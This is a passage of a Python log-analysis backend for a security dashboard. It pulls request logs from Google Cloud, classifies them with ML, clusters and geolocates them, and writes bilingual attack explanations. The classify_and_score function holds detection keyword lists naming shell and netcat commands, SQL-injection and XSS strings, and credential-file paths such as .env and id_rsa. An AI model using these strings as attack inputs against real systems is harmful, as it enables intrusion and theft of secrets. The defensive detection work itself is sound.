                round(math.sqrt(n_samples / 2.0)) + 1,
                2,
                min(MAX_UNSUPERVISED_CLUSTERS, n_samples),
            )
        )

    vectorizer = TfidfVectorizer(
        ngram_range=(1, 2),
        max_features=256,
        sublinear_tf=True,
        lowercase=True,
    )
    try:
        sparse_mat = vectorizer.fit_transform(texts)
        to_array_fn = getattr(sparse_mat, "toarray", None)
        dense_arr = to_array_fn() if callable(to_array_fn) else sparse_mat
        X_txt = np.asarray(dense_arr, dtype=np.float64) * 1.4
    except (ValueError, AttributeError, TypeError):
        X_txt = np.zeros((n_samples, 1), dtype=np.float64)

    scaler = StandardScaler()
    X_num = scaler.fit_transform(np.asarray(num_rows, dtype=np.float64)) * 0.85
    X_combined = np.hstack([X_txt, X_num]).astype(np.float64)

    km = MiniBatchKMeans(
        n_clusters=k,
        random_state=42,
        batch_size=min(256, n_samples),
        n_init=5,
    )
    cluster_ids = km.fit_predict(X_combined)
    distances = np.linalg.norm(X_combined - km.cluster_centers_[cluster_ids], axis=1)

    vocab = vectorizer.get_feature_names_out() if hasattr(vectorizer, "get_feature_names_out") else np.array([])
    txt_dim = X_txt.shape[1]

    grouped_indices: dict[int, list[int]] = defaultdict(list)
    for idx, cid in enumerate(cluster_ids):
        grouped_indices[int(cid)].append(idx)

    ordered_raw_cids = sorted(
        grouped_indices.keys(),
        key=lambda c: len(grouped_indices[c]),
        reverse=True,
    )
    raw_to_sorted_id = {raw_c: new_i for new_i, raw_c in enumerate(ordered_raw_cids)}

    id_to_label: dict[int, str] = {}
    summary_list: list[dict[str, Any]] = []

    for raw_c in ordered_raw_cids:
        new_cid = raw_to_sorted_id[raw_c]
        idxs = grouped_indices[raw_c]
        member_metas = [metas[i] for i in idxs]

        top_terms: list[str] = []
        if len(vocab) > 0 and txt_dim == len(vocab):
            center_txt = km.cluster_centers_[raw_c][:txt_dim]
            top_term_idxs = np.argsort(center_txt)[::-1][:6]
            top_terms = [str(vocab[ti]) for ti in top_term_idxs if center_txt[ti] > 0.05]

        label = _generate_cluster_label(new_cid, member_metas, top_terms)
        id_to_label[new_cid] = label

        path_counter = Counter(m["path"].split("?")[0] for m in member_metas if m["path"])
        sample_paths = [p for p, _ in path_counter.most_common(3)]

        summary_list.append(
            {
                "cluster_id": new_cid,
                "label": label,
                "count": len(idxs),
                "share_pct": round((len(idxs) / n_samples) * 100.0, 1),
                "top_terms": top_terms,
                "sample_paths": sample_paths,
            }
        )

    assignments: list[dict[str, Any]] = []
    for idx in range(n_samples):
        new_cid = raw_to_sorted_id[int(cluster_ids[idx])]
        assignments.append(
            {
                "cluster_id": new_cid,
                "cluster_label": id_to_label[new_cid],
                "cluster_distance": round(float(distances[idx]), 3),
                "cluster_features": metas[idx],
            }
        )

    return assignments, summary_list


def classify_and_score(
    event_type: str,
    method: str,
    path: str,
    payload: str,
    user_agent: str,
    raw_request_line: str = "",
    header_count: int = 6,
) -> tuple[str, float, int, dict[str, Any]]:
    classifier, detector = _get_ready_models()

    signal_text = f"{event_type} {method} {path} {payload} {raw_request_line} {user_agent}".strip()[:4096]
    probs = classifier.predict_proba([signal_text])[0]
    best_idx = int(np.argmax(probs))
    category = str(classifier.classes_[best_idx])
    confidence = round(float(probs[best_idx]) * 100.0, 1)

    lower_sig = signal_text.lower()
    ua_lower = (user_agent or "").lower()
    path_lower = (path or "").lower()
    method_upper = (method or "GET").upper()

    is_tls_hello = "\x16\x03" in raw_request_line or "\\u0016\\u0003" in raw_request_line
    is_scanner_ua = any(
        tok in ua_lower
        for tok in (
            "zgrab",
            "masscan",
            "nuclei",
            "xpanse",
            "internetmeasurement",
            "censysinspect",
            "shodan",
            "python-requests",
            "go-http-client",
        )
    )

    has_rce_signal = any(
        k in lower_sig
        for k in (
            "formsyscmd",
            "next-action",
            "process.mainmodule",
            "child_process",
            "spawn(",
            "|sh",
            "| sh",
            "nc ",
            "/bin/sh",
            "/bin/bash",
            "cmd.exe",
            "powershell",
        )
    )
    has_sqli_signal = any(
        k in lower_sig
        for k in (
            "union select",
            "or 1=1",
            "' or '1'='1",
            "sleep(",
            "benchmark(",
            "waitfor delay",
            "information_schema",
            "<script",
            "../",
        )
    )
    has_cred_probe_signal = any(
        k in path_lower
        for k in (
            ".env",
            ".git",
            "config.json",
            "credentials",
            "id_rsa",
            "backup",
            ".sql",
            "actuator",
            "secrets",
        )
    )

    if has_rce_signal:
        category = "RCE / Command Injection"
        confidence = max(confidence, 88.0)
    elif has_sqli_signal:
        category = "SQLi / XSS Probe"
        confidence = max(confidence, 82.0)
    elif has_cred_probe_signal:
        category = "Credential / Env Theft"
        confidence = max(confidence, 84.0)
    elif is_tls_hello or is_scanner_ua or event_type == "bad_request" or "mgldd" in lower_sig:
        category = "Automated Recon / Scanner"
        confidence = max(confidence, 78.0)
    elif method_upper == "GET" and path_lower in {"", "/", "/robots.txt", "/favicon.ico", "/sitemap.xml"}:
        category = "Automated Recon / Scanner"
        confidence = max(confidence, 72.0)

    special_chars = len(re.findall(r"['\";|<>$`\\{}\[\]\.\./]", f"{path} {payload} {raw_request_line}"[:4096]))
    entropy = _shannon_entropy(f"{path} {payload}"[:2048])
    path_len = min(len(path), 4096)
    payload_len = min(len(payload), 8192)
    safe_headers = max(0, min(_safe_int(header_count, 6), 200))

    features = np.array(
        [[path_len, payload_len, safe_headers, special_chars]],
        dtype=np.float64,
    )
    raw_score = float(detector.decision_function(features)[0])
    anomaly_pct = int(np.clip((0.35 - raw_score) * 140.0, 5, 99))

    if category == "RCE / Command Injection":
        anomaly_pct = max(anomaly_pct, 82)
    elif category in {"SQLi / XSS Probe", "Credential / Env Theft"}:
        anomaly_pct = max(anomaly_pct, 72)
    elif category == "Automated Recon / Scanner":
        anomaly_pct = min(anomaly_pct, 45)

    stats_meta = {
        "path_len": path_len,
        "payload_len": payload_len,
        "header_count": safe_headers,
        "special_chars": special_chars,
        "entropy": entropy,
    }
    return category, confidence, anomaly_pct, stats_meta


def build_attack_explanation(
    category: str,
    confidence: float,
    anomaly_score: int,
    cluster_label: str,
    stats_meta: dict[str, Any],
    cluster_features: dict[str, Any] | None = None,
) -> tuple[str, str, str]:
    """ML分類・異常検知・クラスタ・統計特徴量から、分かりやすい攻撃説明文を生成する。"""
    ja_desc, en_desc = CATEGORY_JA_EXPLANATIONS.get(
        category,
        (
            "通常通信とは異なる不審なリクエストパターンの疑い",
            "Suspicious request pattern differing from normal baseline",
        ),
    )

    c_feat = cluster_features or {}
    entropy = _safe_float(stats_meta.get("entropy", c_feat.get("entropy", 0.0)), 0.0)
    special_chars = _safe_int(stats_meta.get("special_chars", 0), 0)
    payload_len = _safe_int(stats_meta.get("payload_len", 0), 0)
    non_ascii_ratio = _safe_float(c_feat.get("non_ascii_ratio", 0.0), 0.0)
    burst_cnt = _safe_int(c_feat.get("host_burst_count", 1), 1)

    reasons_ja: list[str] = []
    reasons_en: list[str] = []

    if special_chars >= 4:
        reasons_ja.append(f"記号・メタ文字{special_chars}個を検出")
        reasons_en.append(f"{special_chars} special/meta chars")
    if entropy >= 4.8:
        reasons_ja.append(f"エントロピー高({entropy})")
        reasons_en.append(f"high entropy({entropy})")
    if non_ascii_ratio >= 0.15:
        reasons_ja.append(f"非ASCII文字比率{round(non_ascii_ratio * 100, 1)}%")
        reasons_en.append(f"non-ASCII {round(non_ascii_ratio * 100, 1)}%")
    if payload_len >= 256:
        reasons_ja.append(f"ペイロード長{payload_len}B")
        reasons_en.append(f"payload {payload_len}B")
    if burst_cnt >= 2:
        reasons_ja.append(f"同一宛先バースト({burst_cnt}件)")
        reasons_en.append(f"host burst({burst_cnt})")

    if not reasons_ja:
        reasons_ja.append(f"文字長・構造の偏差(異常度{anomaly_score}%)")
        reasons_en.append(f"length/structure deviation(anomaly {anomaly_score}%)")

    attack_summary = sanitize_display_text(
        f"{ja_desc}（{' / '.join(reasons_ja)}）",
        max_len=260,
    )
    attack_summary_en = sanitize_display_text(
        f"{en_desc} ({', '.join(reasons_en)})",
        max_len=260,
    )
    analysis_basis = sanitize_display_text(
        f"ML:{category}[確信度{confidence:.1f}%] | IsolationForest:異常度{anomaly_score}% | 群:{cluster_label}",
        max_len=240,
    )
    return attack_summary, attack_summary_en, analysis_basis


def _is_anomalous_event(category: str, anomaly_score: int, event_type: str = "") -> bool:
    cat_norm = (category or "").strip()
    if HIDE_AUTOMATED_RECON and cat_norm == "Automated Recon / Scanner":
        return False
    return anomaly_score >= ANOMALY_SCORE_THRESHOLD


def _extract_first_ipv4(text: Any) -> str | None:
    if not text:
        return None
    s = str(text)[:4096]
    for token in re.split(r"[,\s]+", s):
        candidate = token.strip().strip('"').strip("'")
        if candidate.startswith("::ffff:"):
            candidate = candidate.removeprefix("::ffff:")
        if is_public_ipv4(candidate):
            return candidate
    m = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", s)
    return m.group(0) if m and is_public_ipv4(m.group(0)) else None


def _normalize_geo_entry(raw_geo: dict[str, Any] | None, ip: str = "") -> dict[str, Any]:
    geo = raw_geo or {}
    cc = str(geo.get("country_code") or "").strip().upper()
    en_name = sanitize_display_text(geo.get("country") or "", max_len=100).strip()
    ja_name = sanitize_display_text(geo.get("country_ja") or "", max_len=100).strip()

    if (ip or "").strip().lower() == "private":
        return {
            "country": "Private / Local",
            "country_ja": "プライベート",
            "country_code": "",
            "flag": "🏠",
            "lat": 0.0,
            "lon": 0.0,
            "isp": sanitize_display_text(geo.get("isp") or "Private Network", max_len=150),
        }

    if cc in COUNTRY_JA_MAP:
        ja_name = COUNTRY_JA_MAP[cc]
    elif not ja_name:
        ja_name = en_name or "Unknown"

    if not en_name:
        en_name = ja_name

    flag = str(geo.get("flag") or "").strip()
    computed_flag = code_to_flag(cc)
    if computed_flag != "🌐":
        flag = computed_flag
    elif not flag or flag == "🌐":
        flag = "🏠" if {en_name, ja_name} & {"Private / Local", "ローカル", "プライベート"} else "🌐"

    return {
        "country": en_name,
        "country_ja": ja_name,
        "country_code": cc,
        "flag": flag,
        "lat": _safe_float(geo.get("lat", 0.0), 0.0),
        "lon": _safe_float(geo.get("lon", 0.0), 0.0),
        "isp": sanitize_display_text(geo.get("isp") or "Unknown ISP", max_len=150),
    }


def _get_cached_geo(ip: str, now_mono: float) -> dict[str, Any] | None:
    entry = GEO_CACHE.get(ip)
    if not entry:
        return None
    ttl = GEO_ERROR_TTL if entry.get("is_error") else GEO_SUCCESS_TTL
    if (now_mono - _safe_float(entry.get("resolved_at", 0.0), 0.0)) < ttl:
        GEO_CACHE.move_to_end(ip)
        return _normalize_geo_entry(entry.get("data"), ip=ip)
    return None


def _set_cached_geo(ip: str, data: dict[str, Any], is_error: bool, now_mono: float) -> None:
    GEO_CACHE[ip] = {
        "resolved_at": now_mono,
        "is_error": is_error,
        "data": _normalize_geo_entry(data, ip=ip),
    }
    GEO_CACHE.move_to_end(ip)
    while len(GEO_CACHE) > MAX_GEO_CACHE_ENTRIES:
        GEO_CACHE.popitem(last=False)


async def resolve_geoip_batch(ips: list[str]) -> dict[str, dict[str, Any]]:
    now_mono = time.monotonic()
    result_map: dict[str, dict[str, Any]] = {}
    uncached: list[str] = []

    for ip in dict.fromkeys(ips):
        cached = _get_cached_geo(ip, now_mono)
        if cached is not None:
            result_map[ip] = cached
            continue
        if is_public_ipv4(ip):
            uncached.append(ip)
        elif (ip or "").strip().lower() == "private":
            data = {
                "country": "Private / Local",
                "country_ja": "プライベート",
                "country_code": "",
                "flag": "🏠",
                "lat": 0.0,
                "lon": 0.0,
                "isp": "Private Network",
            }
            _set_cached_geo(ip, data, is_error=False, now_mono=now_mono)
            result_map[ip] = _normalize_geo_entry(data, ip=ip)
        else:
            data = {
                "country": "Private / Local",
                "country_ja": "ローカル",
                "country_code": "",
                "flag": "🏠",
                "lat": 35.68,
                "lon": 139.76,
                "isp": "Internal Network",
            }
            _set_cached_geo(ip, data, is_error=False, now_mono=now_mono)
            result_map[ip] = _normalize_geo_entry(data, ip=ip)

    if uncached:
        resolved_in_batch: set[str] = set()
        async with httpx.AsyncClient(timeout=8.0) as client:
            for i in range(0, len(uncached), 100):
                batch = uncached[i : i + 100]
                req_body = [
                    {"query": ip, "fields": "status,country,countryCode,lat,lon,isp,query"}
                    for ip in batch
                ]
                for attempt in range(2):
                    try:
                        resp = await client.post("http://ip-api.com/batch", json=req_body)
                        if resp.status_code == 429 and attempt == 0:
                            await asyncio.sleep(1.5)
                            continue
                        resp.raise_for_status()
                        items = resp.json()
                        if isinstance(items, list):
                            for item in items:
                                if not isinstance(item, dict):
                                    continue
                                q_ip = str(item.get("query") or "").strip()
                                if q_ip and item.get("status") == "success":
                                    cc = str(item.get("countryCode") or "").strip().upper()
                                    en_name = str(item.get("country") or "").strip() or "Unknown"
                                    data = {
                                        "country": en_name,
                                        "country_ja": COUNTRY_JA_MAP.get(cc, en_name),
                                        "country_code": cc,
                                        "flag": code_to_flag(cc),
                                        "lat": _safe_float(item.get("lat", 0.0), 0.0),
                                        "lon": _safe_float(item.get("lon", 0.0), 0.0),
                                        "isp": item.get("isp") or "Unknown ISP",
                                    }
                                    _set_cached_geo(q_ip, data, is_error=False, now_mono=now_mono)
                                    result_map[q_ip] = _normalize_geo_entry(data, ip=q_ip)
                                    resolved_in_batch.add(q_ip)
                        break
                    except httpx.HTTPError as exc:
                        if attempt == 0:
                            await asyncio.sleep(0.8)
                            continue
                        logger.warning("GeoIP batch lookup failed: %s", exc)

        for ip in uncached:
            if ip not in resolved_in_batch:
                fallback_data = {
                    "country": "Unknown",
                    "country_ja": "不明",
                    "country_code": "",
                    "flag": "🌐",
                    "lat": 0.0,
                    "lon": 0.0,
                    "isp": "Unknown ISP",
                }
                _set_cached_geo(ip, fallback_data, is_error=True, now_mono=now_mono)
                result_map[ip] = _normalize_geo_entry(fallback_data, ip=ip)

    return result_map


def _extract_user_agent(data: dict[str, Any], http_req: dict[str, Any]) -> str:
    if data.get("user_agent"):
        return sanitize_display_text(data["user_agent"], max_len=500)
    headers = data.get("headers")
    if isinstance(headers, dict):
        for k, v in headers.items():
            if str(k).lower() == "user-agent":
                val = v[0] if isinstance(v, list) and v else (v or "")
                return sanitize_display_text(val, max_len=500)
    req_meta = data.get("requestMetadata")
    if isinstance(req_meta, dict) and req_meta.get("callerSuppliedUserAgent"):
        return sanitize_display_text(req_meta["callerSuppliedUserAgent"], max_len=500)
    if http_req.get("userAgent"):
        return sanitize_display_text(http_req["userAgent"], max_len=500)
    return ""


def _parse_json_dict(raw_val: Any) -> dict[str, Any] | None:
    if isinstance(raw_val, dict):
        return raw_val
    if isinstance(raw_val, str):
        stripped = raw_val.strip()
        if stripped.startswith("{") and stripped.endswith("}"):
            try:
                parsed = json.loads(stripped)
                if isinstance(parsed, dict):
                    return parsed
            except json.JSONDecodeError:
                return None
    return None


def _is_ignored_ip(ip: str) -> bool:
    cleaned = (ip or "").strip()
    if not cleaned:
        return False
    if SKIP_PRIVATE_IPS and _is_private_or_non_public_ip(cleaned):
        return True
    if IGNORED_IPS and cleaned in IGNORED_IPS:
        return True
    if IGNORED_PREFIXES and any(cleaned.startswith(prefix) for prefix in IGNORED_PREFIXES):
        return True
    return False


def _should_skip_record(
    src_ip: str,
    event_type: str,
    user_agent: str,
    path: str,
    raw_text: str,
) -> bool:
    if _is_audit_or_admin_log(src_ip, raw_text, user_agent):
        return True

    if SHOW_ALL_JSON and not any(
        [SKIP_PRIVATE_IPS, SKIP_SYSTEM_NOISE, SKIP_CRAWLERS, SKIP_GOOGLE_LLC, IGNORED_IPS, IGNORED_PREFIXES]
    ):
        return False

    if _is_ignored_ip(src_ip):
        return True

    lower_text = raw_text.lower()
    ua_lower = user_agent.lower()
    ev_lower = (event_type or "").strip().lower()

    if SKIP_SYSTEM_NOISE:
        if ev_lower in SYSTEM_NOISE_EVENTS:
            return True
        if any(pat in lower_text for pat in SYSTEM_NOISE_PATTERNS):
            return True
        if (src_ip or "").strip().lower() in {"", "private", "unknown", "0.0.0.0"} and ev_lower in {
            "text",
            "gce",
            "syslog",
        }:
            return True

    if SKIP_CRAWLERS or SKIP_GOOGLE_LLC:
        if any(kw in ua_lower for kw in CRAWLER_UA_KEYWORDS):
            return True
        if SKIP_GOOGLE_LLC and ("google-lens" in lower_text or "googleusercontent.com" in lower_text):
            return True
        if path in {"/healthz", "/favicon.ico"} and not ua_lower and event_type != "bad_request":
            return True

    return False


def _extract_ip_from_dict(d: dict[str, Any], http_req: dict[str, Any]) -> str:
    for key in (
        "src_ip",
        "remote_ip",
        "client_ip",
        "source_ip",
        "peer_ip",
        "remote_addr",
        "x_forwarded_for",
        "ip",
    ):
        extracted = _extract_first_ipv4(d.get(key))
        if extracted:
            return extracted

    headers = d.get("headers")
    if isinstance(headers, dict):
        for h_key in ("x-forwarded-for", "x-real-ip", "cf-connecting-ip", "true-client-ip"):
            for k, v in headers.items():
                if str(k).lower() == h_key:
                    extracted = _extract_first_ipv4(v)
                    if extracted:
                        return extracted

    req_meta = d.get("requestMetadata")
    if isinstance(req_meta, dict):
        extracted = _extract_first_ipv4(req_meta.get("callerIp"))
        if extracted:
            return extracted

    return _extract_first_ipv4(http_req.get("remoteIp")) or "private"


def _parse_timestamp_str(val: Any, fallback_dt: datetime) -> datetime:
    if isinstance(val, datetime):
        return val if val.tzinfo else val.replace(tzinfo=timezone.utc)
    if isinstance(val, str) and val.strip():
        try:
            dt = datetime.fromisoformat(val.strip().replace("Z", "+00:00"))
            return dt if dt.tzinfo else dt.replace(tzinfo=timezone.utc)
        except ValueError:
            pass
    return fallback_dt


def _build_record_from_dict_and_meta(
    target_dict: dict[str, Any],
    http_req: dict[str, Any],
    ts_dt: datetime,
    fallback_ip: str = "private",
    fallback_event: str = "request",
    source_name: str = "unknown",
    envelope_dict: dict[str, Any] | None = None,
) -> dict[str, Any] | None:
    src_ip = _extract_ip_from_dict(target_dict, http_req)
    if src_ip == "private" and fallback_ip and fallback_ip != "private":
        src_ip = fallback_ip
    if src_ip == "private":
        for text_key in ("raw_request_line", "payload", "body", "message"):
            found = _extract_first_ipv4(target_dict.get(text_key))
            if found:
                src_ip = found
                break

    event_type = sanitize_display_text(
        target_dict.get("event")
        or target_dict.get("event_type")
        or target_dict.get("methodName")
        or fallback_event,
        max_len=120,
    ).lower()
    method = sanitize_display_text(
        target_dict.get("method") or http_req.get("requestMethod") or "GET",
        max_len=40,
    )
    path = sanitize_display_text(
        target_dict.get("path") or http_req.get("requestUrl") or "/",
        max_len=4000,
    )
    raw_req_line = sanitize_display_text(target_dict.get("raw_request_line") or "", max_len=4000).strip()
    body_val = (
        target_dict.get("payload")
        or target_dict.get("body")
        or target_dict.get("message")
        or ""
    )
    headers_obj = target_dict.get("headers")

    full_json_obj: dict[str, Any] = dict(target_dict)
    if envelope_dict and envelope_dict is not target_dict:
        full_json_obj["_envelope"] = envelope_dict

    full_json_str = _safe_json_dumps(full_json_obj, indent=None)
    pretty_json_str = _safe_json_dumps(full_json_obj, indent=2)

    if raw_req_line or body_val:
        parts = [p for p in (raw_req_line, str(body_val) if body_val else "") if p]
        payload_str = f"{' | '.join(parts)} || RAW: {full_json_str}"
    else:
        payload_str = full_json_str

    payload_safe = sanitize_display_text(payload_str)
    payload_full = sanitize_display_text(payload_str, max_len=0)
    pretty_json_safe = sanitize_display_text(pretty_json_str)
    pretty_json_full = sanitize_display_text(pretty_json_str, max_len=0)
    ua = _extract_user_agent(target_dict, http_req)
    header_cnt = (
        len(headers_obj)
        if isinstance(headers_obj, dict)
        else _safe_int(target_dict.get("header_count", 6), 6)
    )
    raw_text_for_filter = f"{event_type} {path} {payload_full} {ua}"

    if _should_skip_record(src_ip, event_type, ua, path, raw_text_for_filter):
        return None

    insert_id = ""
    if isinstance(envelope_dict, dict):
        insert_id = str(envelope_dict.get("insert_id") or envelope_dict.get("insertId") or "").strip()

    return {
        "timestamp": ts_dt.isoformat(),
        "insert_id": insert_id,
        "source": source_name,
        "event_type": event_type,
        "ip": src_ip,
        "method": method,
        "path": path,
        "payload": payload_safe,
        "payload_full": payload_full,
        "raw_json": full_json_obj,
        "raw_json_str": payload_safe,
        "raw_json_pretty": pretty_json_safe,
        "raw_json_pretty_full": pretty_json_full,
        "raw_request_line": raw_req_line,
        "user_agent": ua,
        "header_count": header_cnt,
        "bytes": len(full_json_str.encode("utf-8")) + 160,
    }


def _obj_to_record(
    obj: Any,
    blob_updated: datetime,
    cutoff_dt: datetime | None,
    source_name: str = "gcs",
) -> dict[str, Any] | None:
    if isinstance(obj, dict):
        raw_http_req = obj.get("httpRequest")
        http_req: dict[str, Any] = raw_http_req if isinstance(raw_http_req, dict) else {}

        nested_raw = (
            _parse_json_dict(obj.get("jsonPayload"))
            or (obj.get("jsonPayload") if isinstance(obj.get("jsonPayload"), dict) else None)
            or _parse_json_dict(obj.get("message"))
        )
        target_dict: dict[str, Any] = nested_raw if isinstance(nested_raw, dict) else obj

        ts_raw = (
            obj.get("timestamp")
            or obj.get("receiveTimestamp")
            or target_dict.get("timestamp")
            or target_dict.get("time")
        )
        ts_dt = _parse_timestamp_str(ts_raw, blob_updated)
        if cutoff_dt is not None and ts_dt < cutoff_dt:
            return None

        envelope_meta: dict[str, Any] = {}
        for k in ("insertId", "insert_id", "logName", "log_name", "severity", "labels"):
            if k in obj:
                envelope_meta[k] = obj[k]

        return _build_record_from_dict_and_meta(
            target_dict=target_dict,
            http_req=http_req,
            ts_dt=ts_dt,
            fallback_ip=_extract_ip_from_dict(obj, http_req),
            fallback_event=str(obj.get("event") or obj.get("methodName") or "request").lower(),
            source_name=source_name,
            envelope_dict=envelope_meta or (obj if target_dict is not obj else None),
        )

    if isinstance(obj, str) and obj.strip() and (cutoff_dt is None or blob_updated >= cutoff_dt):
        line_full = sanitize_display_text(obj.strip(), max_len=0)
        line_safe = sanitize_display_text(obj.strip())
        src_ip = _extract_first_ipv4(line_full) or "private"
        if _should_skip_record(src_ip, "text", "", "/", line_full):
            return None
        raw_obj = {"event": "text", "message": line_full, "timestamp": blob_updated.isoformat()}
        pretty_full = _safe_json_dumps(raw_obj, indent=2)
        return {
            "timestamp": blob_updated.isoformat(),
            "insert_id": "",
            "source": source_name,
            "event_type": "text",
            "ip": src_ip,
            "method": "GET",
            "path": "/",
            "payload": line_safe,
            "payload_full": line_full,
            "raw_json": raw_obj,
            "raw_json_str": _safe_json_dumps(raw_obj),
            "raw_json_pretty": sanitize_display_text(pretty_full),
            "raw_json_pretty_full": pretty_full,
            "raw_request_line": "",
            "user_agent": "",
            "header_count": 6,
            "bytes": len(line_full.encode("utf-8")) + 160,
        }

    return None


def _entry_to_record(entry: Any, cutoff_dt: datetime | None, source_name: str = "logging") -> dict[str, Any] | None:
    ts_dt = _parse_timestamp_str(getattr(entry, "timestamp", None), datetime.now(timezone.utc))
    if cutoff_dt is not None and ts_dt < cutoff_dt:
        return None

    payload_raw = getattr(entry, "payload", None)
    http_req_raw = getattr(entry, "http_request", None)
    http_req: dict[str, Any] = http_req_raw if isinstance(http_req_raw, dict) else {}

    if isinstance(payload_raw, dict):
        target_dict: dict[str, Any] = payload_raw
    elif isinstance(payload_raw, str):
        parsed = _parse_json_dict(payload_raw)
        target_dict = parsed if parsed is not None else {"message": payload_raw}
    else:
        target_dict = {}

    fallback_ip = "private"
    labels = getattr(entry, "labels", None)
    if isinstance(labels, dict):
        for lbl_key in ("src_ip", "remote_ip", "client_ip", "ip"):
            found = _extract_first_ipv4(labels.get(lbl_key))
            if found:
                fallback_ip = found
                break

    envelope_meta: dict[str, Any] = {
        "log_name": getattr(entry, "log_name", None),
        "insert_id": getattr(entry, "insert_id", None),
        "severity": str(getattr(entry, "severity", "") or ""),
        "labels": labels if isinstance(labels, dict) else {},
    }

    return _build_record_from_dict_and_meta(
        target_dict=target_dict,
        http_req=http_req,
        ts_dt=ts_dt,
        fallback_ip=fallback_ip,
        fallback_event=str(getattr(entry, "log_name", None) or "request").lower(),
        source_name=source_name,
        envelope_dict=envelope_meta,
    )


def _parse_blob_text_to_records(
    content: str,
    blob_updated: datetime,
    cutoff_dt: datetime | None,
    max_records: int,
    source_name: str = "gcs",
) -> list[dict[str, Any]]:
    stripped = content.strip()
    if not stripped or max_records <= 0:
        return []

    out: list[dict[str, Any]] = []
    if stripped.startswith("["):
        try:
            arr = json.loads(stripped)
            if isinstance(arr, list):
                for item in arr:
                    rec = _obj_to_record(item, blob_updated, cutoff_dt, source_name=source_name)
                    if rec is not None:
                        out.append(rec)
                        if len(out) >= max_records:
                            return out
                return out
        except json.JSONDecodeError:
            logger.debug("JSON array parse fallback to line-by-line in %s", source_name)

    for line in stripped.splitlines():
        line_s = line.strip()
        if not line_s:
            continue
        try:
            parsed = json.loads(line_s)
            rec = _obj_to_record(parsed, blob_updated, cutoff_dt, source_name=source_name)
        except json.JSONDecodeError:
            rec = _obj_to_record(line_s, blob_updated, cutoff_dt, source_name=source_name)
        if rec is not None:
            out.append(rec)
            if len(out) >= max_records:
                break

    return out


def _fetch_cloud_logging_entries_sync(cutoff_dt: datetime | None, limit: int) -> list[dict[str, Any]]:
    if limit <= 0 or not LOG_PROJECTS:
        return []

    clauses: list[str] = []
    if cutoff_dt is not None:
        cutoff_iso = cutoff_dt.strftime("%Y-%m-%dT%H:%M:%SZ")
        clauses.append(f'timestamp >= "{cutoff_iso}"')
    if EXCLUDE_AUDIT_AND_ADMIN_LOGS:
        clauses.append('logName !~ "cloudaudit.googleapis.com"')
    if LOG_FILTER:
        clauses.append(f"({LOG_FILTER})")
    full_filter = " AND ".join(clauses)

    records: list[dict[str, Any]] = []
    per_project_limit = limit
    page_size = min(max(per_project_limit, 100), 1000)

    for project_id in LOG_PROJECTS:
        if len(records) >= limit:
            break
        try:
            logging_client = gcp_logging.Client(project=project_id)
            entries = logging_client.list_entries(
                filter_=full_filter or None,
                order_by=gcp_logging.DESCENDING,
                page_size=page_size,
            )
            count_for_proj = 0
            for entry in entries:
                rec = _entry_to_record(entry, cutoff_dt, source_name=f"logging:{project_id}")
                if rec is not None:
                    records.append(rec)
                    count_for_proj += 1
                    if count_for_proj >= per_project_limit or len(records) >= limit:
                        break
        except Exception as exc:
            logger.warning("Failed to fetch logs from Cloud Logging project %s: %s", project_id, exc)

    return records[:limit]


def _fetch_gcs_entries_sync(now_dt: datetime, cutoff_dt: datetime | None, limit: int) -> list[dict[str, Any]]:
    if limit <= 0 or not LOG_GCS_BUCKETS:
        return []

    try:
        storage_client = gcp_storage.Client(project=GCP_PROJECT_ID)
    except Exception as exc:
        logger.warning("Failed to initialize GCS client: %s", exc)
        return []

    records: list[dict[str, Any]] = []
    per_bucket_limit = limit
    min_blob_time = (cutoff_dt - timedelta(days=1)) if cutoff_dt is not None else None

    for bucket_name in LOG_GCS_BUCKETS:
        if len(records) >= limit:
            break
        try:
            bucket = storage_client.bucket(bucket_name)
            blobs = list(bucket.list_blobs(prefix=LOG_GCS_PREFIX or None))
        except Exception as exc:
            logger.warning("Failed to list GCS blobs in target %s: %s", bucket_name, exc)
            continue

        if min_blob_time is not None:
            candidate_blobs = [b for b in blobs if (b.updated is None or b.updated >= min_blob_time)]
        else:
            candidate_blobs = list(blobs)

        candidate_blobs.sort(
            key=lambda b: b.updated or datetime.min.replace(tzinfo=timezone.utc),
            reverse=True,
        )

        bucket_count = 0
        for blob in candidate_blobs[:MAX_GCS_BLOBS]:
            if bucket_count >= per_bucket_limit or len(records) >= limit:
                break
            if blob.size is not None and blob.size > MAX_GCS_BLOB_BYTES:
                logger.warning("Skipping oversized GCS blob %s/%s (%d bytes)", bucket_name, blob.name, blob.size)
                continue
            try:
                blob_updated = (
                    blob.updated
                    if blob.updated and blob.updated.tzinfo
                    else (blob.updated or now_dt).replace(tzinfo=timezone.utc)
                )
                text = blob.download_as_text(encoding="utf-8")
                rem = min(per_bucket_limit - bucket_count, limit - len(records))
                parsed_recs = _parse_blob_text_to_records(
                    text,
                    blob_updated,
                    cutoff_dt,
                    max_records=rem,
                    source_name=f"gcs:{bucket_name}/{blob.name}",
                )
                records.extend(parsed_recs)
                bucket_count += len(parsed_recs)
            except Exception as exc:
                logger.warning("Failed to read GCS blob %s/%s: %s", bucket_name, blob.name, exc)

    return records[:limit]


def _fetch_bigquery_entries_sync(cutoff_dt: datetime | None, limit: int) -> list[dict[str, Any]]:
    if not ENABLE_BIGQUERY_LOGS or limit <= 0 or not BQ_TABLE_ID:
        return []

    safe_limit = min(max(limit, 1), MAX_ALLOWED_LIMIT)
    where_clause = ""
    if cutoff_dt is not None:
        cutoff_iso = cutoff_dt.strftime("%Y-%m-%dT%H:%M:%SZ")
        where_clause = f"\nWHERE\n  timestamp >= TIMESTAMP('{cutoff_iso}')"

    query = f"""
SELECT
  timestamp,
  jsonPayload,
  textPayload
FROM
  `{BQ_TABLE_ID}`{where_clause}
ORDER BY
  timestamp DESC
LIMIT {safe_limit}
"""

    records: list[dict[str, Any]] = []
    try:
        bq_client = gcp_bigquery.Client(project=BQ_PROJECT_ID)
        for row in bq_client.query(query).result():
            ts_dt = _parse_timestamp_str(getattr(row, "timestamp", None), datetime.now(timezone.utc))
            if cutoff_dt is not None and ts_dt < cutoff_dt:
                continue

            jp = _parse_json_dict(getattr(row, "jsonPayload", None))
            tp = getattr(row, "textPayload", None)
            if jp:
                target_dict: dict[str, Any] = jp
            elif isinstance(tp, str) and tp.strip():
                target_dict = _parse_json_dict(tp) or {"event": "text", "message": tp.strip()}
            else:
                continue

            msg = target_dict.get("message")
            if isinstance(msg, str) and msg.strip().startswith("{"):
                nested_msg = _parse_json_dict(msg)
                if nested_msg:
                    merged = dict(nested_msg)
                    for k, v in target_dict.items():
                        if k != "message" and v is not None:
                            merged.setdefault(k, v)
                    target_dict = merged

